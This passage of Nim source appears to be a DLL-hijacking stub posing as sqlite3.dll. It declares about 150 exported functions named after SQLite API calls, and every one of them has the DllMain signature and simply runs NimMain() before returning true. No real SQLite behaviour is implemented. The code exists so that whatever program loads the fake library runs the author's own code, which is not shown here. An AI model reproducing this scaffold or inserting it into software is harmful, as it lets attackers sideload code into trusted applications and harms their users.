  return true 

proc `sqlite3_free`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_free_table`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_fts3_may_be_corrupt`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_fts5_may_be_corrupt`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_get_autocommit`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_get_auxdata`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_get_table`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_global_recover`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_initialize`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_interrupt`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_keyword_check`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_keyword_count`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_keyword_name`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_last_insert`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_libversion`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_libversion_number`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_limit`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_load_extension`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_log`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_malloc`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_malloc64`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_memory_alarm`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_memory_highwater`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_memory_used`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true

proc `sqlite3_mprintf`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_msize`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_mutex_alloc`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_mutex_enter`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_mutex_free`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_mutex_leave`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_mutex_try`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_next_stmt`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_open`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_open16`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_open_v2`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_os_end`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_os_init`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_overload_function`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_prepare`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_prepare16`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_prepare16_v2`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_prepare16_v3`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_prepare_v2`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_prepare_v3`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_profile`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_progress_handler`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_randomness`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_realloc`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_realloc64`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_release_memory`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_reset`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_reset_auto_extension`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_result_blob`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_result_blob64`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true

proc `sqlite3_result_double`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_result_error`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_result_error16`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_result_error_code`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_result_error_nomem`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_result_error_toobig`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_result_int`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_result_int64`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_result_null`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_result_pointer`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_result_subtype`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_result_text`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_result_text16`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_result_text16be`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_result_text16le`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_result_text64`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_result_value`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_result_zeroblob`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_result_zeroblob64`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_rollback_hook`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_rtree_geometry_callback`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_rtree_query_callback`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_set_authorizer`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_set_auxdata`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true

proc `sqlite3_set_last_insert_rowid`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_shutdown`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_sleep`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_snprintf`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_soft_heap_limit`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_soft_heap_limit64`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_sourceid`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_sql`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_status`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_status64`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_step`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_stmt_busy`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_stmt_isexplain`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_stmt_readonly`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_stmt_status`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_str_append`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_str_appendall`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_str_appendchar`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_str_appendf`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_str_errcode`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_str_finish`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_str_length`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_str_new`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_str_reset`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_str_value`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_str_vappendf`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_strglob`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_stricmp`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_strlike`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_strnicmp`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_system_errno`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_table_column_metadata`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_temp_directory`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_test_control`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_thread_cleanup`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_threadsafe`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_total_changes`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_trace`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_trace_v2`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_transfer_bindings`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_update_hook`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_uri_boolean`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_uri_int64`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_uri_parameter`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_user_data`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_value_blob`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_value_bytes`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_value_bytes16`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_value_double`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_value_dup`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_value_free`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_value_frombind`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_value_int`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_value_int64`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_value_nochange`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_value_numeric_type`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true

proc `sqlite3_value_pointer`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_value_subtype`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_value_text`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_value_text16`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_value_text16be`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_value_text16le`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_value_type`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_version`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_vfs_find`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_vfs_register`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_vfs_unregister`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_vmprintf`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_vsnprintf`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_vtab_collation`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_vtab_config`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_vtab_nochange`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_vtab_on_conflict`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_wal_autocheckpoint`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_wal_checkpoint`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_wal_checkpoint_v2`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_wal_hook`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_win32_is_nt`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_win32_mbcs_to_utf8`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_win32_mbcs_to_utf8_v2`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_win32_set_directory`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_win32_set_directory16`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_win32_set_directory8`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_win32_sleep`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_win32_unicode_to_utf8`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_win32_utf8_to_mbcs`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_win32_utf8_to_mbcs_v2`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_win32_utf8_to_unicode`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

